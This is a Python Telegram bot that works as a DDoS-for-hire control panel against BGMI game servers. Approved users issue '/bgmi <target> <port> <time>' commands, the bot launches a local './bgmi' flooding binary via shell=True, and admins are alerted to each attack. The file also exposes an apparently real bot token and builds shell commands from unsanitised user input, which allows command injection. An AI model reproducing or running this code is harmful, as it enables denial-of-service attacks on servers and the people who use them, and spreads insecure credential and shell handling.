#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7826762784:AAGuTzCeoogMlqaa2NxfCDRxB-GBqjCYXnw')

# Admin user IDs
admin_id = ["1383324178", "6060545769", "1871909759"]

# File to store allowed user IDs
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
APPROVED_USERS_FILE = "approved_users.txt"

# Dictionary to track user attacks per day
user_attacks = {}
reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
MAX_ATTACKS_PER_DAY = 20

# Reset attack count at midnight
def reset_attack_counts():
    global reset_time, user_attacks
    if datetime.datetime.now() >= reset_time:
        user_attacks = {}
        reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)

# Function to read approved users from the file
def read_approved_users():
    try:
        with open(APPROVED_USERS_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store approved user IDs
approved_user_ids = read_approved_users()

# ✅ Command: /approve <user_id> (Admins Only)
@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 Only Admins Can Approve Users!")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /approve <user_id>")
        return

    target_user_id = command_parts[1]

    if target_user_id not in approved_user_ids:
        approved_user_ids.append(target_user_id)
        with open(APPROVED_USERS_FILE, "a") as file:
            file.write(target_user_id + "\n")
        response = f"✅ User {target_user_id} has been approved for attacks."
    else:
        response = f"⚠️ User {target_user_id} is already approved."

    bot.reply_to(message, response)

# ✅ Command: /deny <user_id> (Admins Only)
@bot.message_handler(commands=['deny'])
def deny_user(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "🚫 Only Admins Can Deny Users!")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /deny <user_id>")
        return

    target_user_id = command_parts[1]

    if target_user_id in approved_user_ids:
        approved_user_ids.remove(target_user_id)
        with open(APPROVED_USERS_FILE, "w") as file:
            file.writelines([user_id + "\n" for user_id in approved_user_ids])
        response = f"❌ User {target_user_id} has been denied approval for attacks."
    else:
        response = f"⚠️ User {target_user_id} is not approved."

    bot.reply_to(message, response)

# ✅ Ensure `/bgmi` Follows Attack Limits and Notifies Admins
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    reset_attack_counts()
    user_id = str(message.chat.id)

    if user_id not in approved_user_ids:
        bot.reply_to(message, "🚫 You are not approved for attacks. Contact an admin for approval.")
        return

    if user_attacks.get(user_id, 0) >= MAX_ATTACKS_PER_DAY:
        bot.reply_to(message, "🚫 You have reached your daily limit of 20 attacks. Try again tomorrow.")
        return

    user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
    remaining_attacks = MAX_ATTACKS_PER_DAY - user_attacks[user_id]

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        time = int(command[3])

        if time > 300:
            response = "Error: Time interval must be less than 300."
        else:
            response = f"BGMI Attack Started! 🔥\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
            full_command = f"./bgmi {target} {port} {time}"
            subprocess.run(full_command, shell=True)

            # ✅ Notify Admins when a user attacks
            attack_info = f"🚨 **Attack Alert** 🚨\n" \
                          f"👤 User ID: {user_id}\n" \
                          f"🎯 Target: {target}\n" \
                          f"🔢 Port: {port}\n" \
                          f"⏳ Duration: {time} seconds\n" \
                          f"🔥 Remaining Attacks: {remaining_attacks} / {MAX_ATTACKS_PER_DAY}"
            
            for admin in admin_id:
                bot.send_message(admin, attack_info)

    else:
        response = "✅ Usage: /bgmi <target> <port> <time>"

    bot.reply_to(message, response)

# Other Commands (Kept from Your Original Script)
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"👋🏻 Welcome, {user_name}! Try /help for commands."
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 Available commands:
💥 /bgmi <target> <port> <time> : Attack command.
💥 /myinfo : Check your info.
💥 /approve <user_id> : (Admin) Approve a user for attacks.
💥 /deny <user_id> : (Admin) Deny a user from attacks.
💥 /start : Start bot.
💥 /help : Show this message.
'''
    bot.reply_to(message, help_text)

# Run the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
